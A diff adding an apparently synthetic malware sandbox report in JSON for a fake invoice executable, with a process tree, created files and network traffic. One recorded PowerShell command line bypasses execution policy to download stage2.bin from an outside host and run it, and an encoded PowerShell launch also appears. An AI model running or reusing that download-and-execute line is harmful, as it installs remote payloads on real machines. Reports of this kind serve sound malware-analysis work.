@@ -1,0 +1,102 @@
+{
+  "submission_info": {
+    "analyzer": "Falcon Sandbox Cloud Engine",
+    "engine_version": "v7.1.0-enterprise",
+    "schema": "falcon_hybrid_v3",
+    "sample_metadata": {
+      "submitted_name": "invoice_oct2026.exe",
+      "sha256": "7f83b1657ff1fc53b92dc18148a1d65dfc2d4b1fa3d677284addd200126d9069",
+      "target_os": "Windows 10 Pro 64-bit Build 19042"
+    },
+    "runtime_budget_seconds": 60,
+    "system_warnings": [
+      {
+        "code": "WARN_TIMEOUT",
+        "description": "Sandbox run reached maximum configured execution window (60s). Secondary processes were killed before termination."
+      },
+      {
+        "code": "WARN_EGRESS_POLICY",
+        "description": "Outbound egress connection attempts to non-standard TCP ports (e.g. 8080) were intercepted and blocked by perimeter firewall."
+      }
+    ]
+  },
+  "execution": {
+    "process_tree": [
+      {
+        "pid": 7112,
+        "ppid": 400,
+        "name": "invoice_oct2026.exe",
+        "cmdline": "\"C:\\sandbox\\samples\\invoice_oct2026.exe\"",
+        "integrity_level": "Medium",
+        "children": [
+          {
+            "pid": 8240,
+            "ppid": 7112,
+            "name": "cmd.exe",
+            "cmdline": "cmd.exe /c \"powershell -enc JABzAD0ATgBlAHcALQBPAGIA... -ExecutionPolicy Bypass\"",
+            "integrity_level": "Medium",
+            "children": [
+              {
+                "pid": 8896,
+                "ppid": 8240,
+                "name": "powershell.exe",
+                "cmdline": "powershell.exe -ExecutionPolicy Bypass -NoProfile -Command \"Invoke-WebRequest -Uri https://cloud-storage-cdn.net/stage2.bin -OutFile C:\\sandbox\\temp\\staged_runner.bin; Start-Process C:\\sandbox\\temp\\staged_runner.bin\"",
+                "integrity_level": "Medium",
+                "children": [
+                  {
+                    "pid": 9024,
+                    "ppid": 8896,
+                    "name": "staged_runner.bin",
+                    "cmdline": "\"C:\\sandbox\\temp\\staged_runner.bin\"",
+                    "integrity_level": "Medium",
+                    "children": []
+                  }
+                ]
+              }
+            ]
+          }
+        ]
+      }
+    ],
+    "created_files": [
+      {
+        "filename": "C:\\sandbox\\temp\\staged_runner.bin",
+        "sha256_hash": "a1b2c3d4e5f67890123456789abcdef0123456789abcdef0123456789abcdef0",
+        "file_bytes": 104448,
+        "magic": "PE32 executable (GUI) Intel 80386",
+        "origin_pid": 8896
+      },
+      {
+        "filename": "C:\\sandbox\\crash_reporter.log",
+        "sha256_hash": "ffff1111222233334444555566667777888899990000aaaabbbbccccddddeeee",
+        "file_bytes": 512,
+        "magic": "ASCII text, with CRLF line terminators",
+        "origin_pid": 7112
+      }
+    ],
+    "network_traffic": {
+      "dns_requests": [
+        {
+          "hostname": "cloud-storage-cdn.net",
+          "ip_addresses": ["198.51.100.42"]
+        }
+      ],
+      "http_transactions": [
+        {
+          "method": "GET",
+          "uri": "https://cloud-storage-cdn.net/stage2.bin",
+          "response_code": 200,
+          "source_pid": 8896
+        }
+      ],
+      "active_tcp_streams": [
+        {
+          "destination_ip": "198.51.100.42",
+          "destination_port": 443,
+          "origin_pid": 8896,
+          "state": "ESTABLISHED"
+        }
+      ]
+    }
+  }
+}
